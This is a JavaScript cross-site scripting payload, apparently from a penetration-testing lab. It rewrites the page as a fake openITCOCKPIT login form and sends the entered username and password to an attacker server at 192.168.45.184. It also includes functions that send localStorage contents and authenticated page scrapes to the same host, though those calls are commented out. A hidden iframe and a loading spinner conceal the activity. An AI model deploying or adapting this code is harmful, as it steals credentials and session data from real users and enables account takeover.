body = `
<html lang=\"en\"><head>
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
    <title>
        Login - open source system monitoring    </title>
    <link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"icon\"><link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"shortcut icon\">    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/smartadmin/css/font-awesome.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/login.css?1716884445\">

    <script type=\"text/javascript\" src=\"/frontend/js/lib/jquery.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/lib/particles.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/login.js?1716884445\"></script>
</head>

<body>
<body class=\"main\">
    <div class=\"login-screen\">
        <figure>
            <figcaption>Photo by SpaceX on Unsplash</figcaption>
        </figure>
        <figure>
            <figcaption>Photo by NASA on Unsplash</figcaption>
        </figure>
    </div>
<div class=\"container-fluid\">
    <div class=\"row\">
                    <div id=\"particles-js\" class=\"col-xs-12 col-sm-6 col-md-7 col-lg-9\"><canvas class=\"particles-js-canvas-el\" style=\"width: 100%; height: 100%;\" width=\"1410\" height=\"443\"></canvas></div>
            </div>
</div>

<div class=\"login-center\">
    <div class=\"min-height container-fluid\">
        <div class=\"row\">
            <div class=\"col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9\">
                <div class=\"login\" id=\"card\">
                    <div class=\"login-alert\">
                                                                    </div>
                    <div class=\"login-header\">
                        <h1>openITCOCKPIT</h1>
                        <h4>Open source system monitoring</h4>
                    </div>
                    <div class=\"login-form-div\">
                        <div class=\"front signin_form\">
                            <p>Login</p>
                            <form onsubmit=\"return false\" novalidate=\"novalidate\" id=\"login-form\" class=\"login-form\" method=\"post\" accept-charset=\"utf-8\"><div style=\"display:none;\"><input type=\"hidden\" name=\"_method\" value=\"POST\"></div>
                            
                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input id=\"usernameinj\" name=\"data[LoginUser][username]\" class=\"form-control\" placeholder=\"Type your email or username\" inputdefaults=\"  \" type=\"text\" id=\"LoginUserUsername\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-user\"></i>
                                    </span>
                                </div>
                            </div>


                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input id=\"passwordinj\" name=\"data[LoginUser][password]\" class=\"form-control\" placeholder=\"Type your password\" inputdefaults=\"  \" type=\"password\" id=\"LoginUserPassword\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-lock\"></i>
                                    </span>
                                </div>
                            </div>

                            <div class=\"checkbox\">
                                <div class=\"checkbox\"><input type=\"hidden\" name=\"data[LoginUser][remember_me]\" id=\"LoginUserRememberMe_\" value=\"0\"><label for=\"LoginUserRememberMe\"><input type=\"checkbox\" name=\"data[LoginUser][remember_me]\" class=\"\" value=\"1\" id=\"LoginUserRememberMe\"> Remember me on this computer</label></div>                            </div>

                            <div class=\"form-group sign-btn\">
                                <button onclick=\"getCreds();\" type=\"submit\" class=\"btn btn-primary pull-right\">
                                    Sign in                                </button>
                            </div>
                            </form>                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class=\"footer\">
    <div class=\"container-fluid\">
        <div class=\"row pull-right\">
            <div class=\"col-xs-12\">
                <a href=\"https://openitcockpit.io/\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-globe\"></i>
                </a>
                <a href=\"https://github.com/it-novum/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-github\"></i>
                </a>
                <a href=\"https://twitter.com/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-twitter\"></i>
                </a>
            </div>
        </div>
    </div>
</div>
<div class=\"container\">
    <div class=\"row\">
        <div class=\"col-xs-12\">
                    </div>
    </div>
</div>

<iframe style=\"display:none\" src=\"https://openitcockpit\" width=\"100%\" height=\"100%\"></iframe></body></html>

<style>
.spinner-container {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.5); 
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999; 
}

.spinner {
  width: 50px;
  height: 50px;
  border: 4px solid rgba(255, 255, 255, 0.3);
  border-top: 4px solid #fff; 
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
</style>
`

document.getElementsByTagName("html")[0].innerHTML = body

validURL = (url) => {
    if (url.includes('logout') || url.includes('log-out') || url.includes('signout') || url.includes('sign-out')){
        return false;
    }
    if (!(url.startsWith('https'))){
        return false;
    }
    return true;
}

getLocalStorage = () => {
    Object.keys(localStorage).forEach(key => {
        fetch("https://192.168.45.184/save_cookies", {
            body: "name=" + encodeURIComponent(key) + "&value=" + encodeURIComponent(localStorage.getItem(key)),
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            method: "POST"
        });
    })
}

getPageContent = () => {
    var allA = iframe.contentDocument.getElementsByTagName("a");

    var allHrefs = [];
    for (var i=0;i<allA.length; i++){ // Adds all links into array
        allHrefs.push(allA[i].href);
    }
    var uniqueHrefs = _.unique(allHrefs);
    var validHrefs = [];
    for (var i=0; i<uniqueHrefs.length; i++){
        if (validURL(uniqueHrefs[i])){
            validHrefs.push(uniqueHrefs[i]);
        }
    }
    // Run the request asynchronously to ensure it won't freez   e up user's browser
    validHrefs.forEach(href => {
        console.log("Attempting " + href);
        fetch(href, {
            "credentials": "include",
            "method": "GET"
        })
        .catch(err => {
            return err;
        }).then((response) => {
            return response.text();
        }).then((text) => {
            fetch("https://192.168.45.184/save_page", {
                body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
                headers: {"Content-Type": "application/x-www-form-urlencoded"},
                method: "POST"
            });
        });
    });
}

getCreds = () => {
    console.log("Cred grab")
    savedUsername = document.getElementById("usernameinj").value;
    savedPassword = document.getElementById("passwordinj").value;
    if (savedUsername === "" || savedPassword === ""){
        return false;
    }
    cred = savedUsername + ":" + savedPassword
    fetch("https://192.168.45.184/save_credentials", {
        body: "url=homepage&value=" + encodeURIComponent(cred),
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        method: "POST"
    });
}

actions = () => {
    // get all objects from local storage
    // setTimeout(() => {
    //     getLocalStorage();
    // }, 2500); // Leave time for page to load

    // // get page content through scraping
    // setTimeout(() => {
    //     getPageContent();
    // }, 3000); // Leave time for page to load

    // get saved passwords
    // Source: https://gosecure.ai/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/
    getCreds();
}

var iframe = document.createElement('iframe');
iframe.setAttribute("style", "display:none"); // Don't want victim to see page loading
iframe.onload=actions;
iframe.width="100%";
iframe.height="100%";
iframe.src="https://openitcockpit"

body = document.getElementsByTagName('body')[0];
body.appendChild(iframe);

function addLoadingSpinner() {
  // Create the spinner elements
  const spinnerContainer = document.createElement("div");
  const spinner = document.createElement("div");

  // Set classes for styling (customize these as needed)
  spinnerContainer.classList.add("spinner-container");
  spinner.classList.add("spinner");

  // Append spinner to its container
  spinnerContainer.appendChild(spinner);

  // Get the target container (or use the body as default)
  const container = document.getElementsByTagName("body")[0];

  // Append the spinner container to the target
  container.appendChild(spinnerContainer);

  setTimeout(() => {
    container.removeChild(spinnerContainer);
  }, 4000);
}

// Call the function to add the spinner
addLoadingSpinner(); // You can pass a different container ID if needed
